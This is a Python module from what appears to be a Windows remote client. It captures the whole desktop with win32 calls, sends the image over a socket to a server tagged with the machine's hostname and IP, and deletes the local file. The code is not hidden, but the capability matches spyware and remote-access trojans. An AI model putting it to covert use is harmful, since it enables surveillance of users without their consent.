from threading import Thread
import win32con
import win32gui
import win32ui
import socket
import ctypes
import os

# Temp
from datetime import datetime

from Modules.logger import init_logger


class Screenshot:
    def __init__(self, client, log_path, app_path):
        self.app_path = app_path
        self.ps_path = rf'{app_path}\screenshot.ps1'
        self.client = client
        self.log_path = log_path
        self.logger = init_logger(self.log_path, __name__)

        # d = datetime.now().replace(microsecond=0).strftime("%d-%b-%y %I.%M.%S %p")
        self.logger.debug(f"Defining screenshot file name...")
        self.filename = rf"screenshot {self.client.hostname} {self.client.localIP} {self.get_date()}.jpg"
        self.file_path = os.path.join(app_path, self.filename)
        self.logger.debug(f"File name: {self.filename}")

    def get_date(self) -> str:
        d = datetime.now().replace(microsecond=0)
        dt = str(d.strftime("%d-%b-%y %I.%M.%S %p"))
        return dt

    def convert_to_bytes(self, no):
        result = bytearray()
        result.append(no & 255)
        for i in range(3):
            no = no >> 8
            result.append(no & 255)
        return result

    def run_script(self):
        self.logger.debug(f"Capturing screenshot...")
        desktop = win32gui.GetDesktopWindow()

        SM_CXVIRTUALSCREEN = 78
        SM_CYVIRTUALSCREEN = 79
        SM_XVIRTUALSCREEN = 76
        SM_YVIRTUALSCREEN = 77

        width = ctypes.windll.user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
        height = ctypes.windll.user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)
        left = ctypes.windll.user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
        top = ctypes.windll.user32.GetSystemMetrics(SM_YVIRTUALSCREEN)

        desktop_dc = win32gui.GetWindowDC(desktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)

        mem_dc = img_dc.CreateCompatibleDC()
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

        screenshot.SaveBitmapFile(mem_dc, self.file_path)

        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())
        self.logger.debug(f"Screenshot captured.")
        self.logger.info(f"run_script completed.")

    def send_file(self):
        try:
            # Send filename to server
            self.logger.debug(f"Sending file name to server...")
            self.client.soc.send(f"{self.filename}".encode())

            # Receive filename Confirmation from the server
            self.logger.debug(f"Waiting for confirmation...")
            msg = self.client.soc.recv(1024).decode()
            self.logger.debug(f"Server confirmation: {msg}")
            self.logger.debug(f"Calculating file size...")
            length = os.path.getsize(self.file_path)
            self.logger.debug(f"Sending file size to server...")
            self.client.soc.send(self.convert_to_bytes(length))

            # Send file content
            self.logger.debug(f"Opening {self.filename} with read bytes permissions...")
            with open(self.file_path, 'rb') as img_file:
                img_data = img_file.read(1024)
                self.logger.debug(f"Sending file content...")
                while img_data:
                    self.client.soc.send(img_data)
                    if not img_data:
                        break

                    img_data = img_file.read(1024)

            self.logger.info(f"send_file Completed.")

        except (WindowsError, socket.error, ConnectionError) as e:
            self.logger.debug(f"Connection Error: {e}")
            return False

    def confirm(self):
        try:
            self.logger.debug(f"Sending confirmation...")
            self.client.soc.send(f"{self.client.hostname} | {self.client.localIP}: Screenshot Completed.\n".encode())

        except (WindowsError, socket.error) as e:
            self.logger.debug(f"Connection error: {e}")
            return False

    def run(self):
        self.logger.debug(f"Calling run_script()...")
        self.run_script()
        self.logger.debug(f"Calling send_file()...")
        self.send_file()
        self.logger.debug(f"Calling confirm()...")
        self.confirm()
        os.remove(self.file_path)
        self.logger.debug(f"=== End of screenshot() ===")
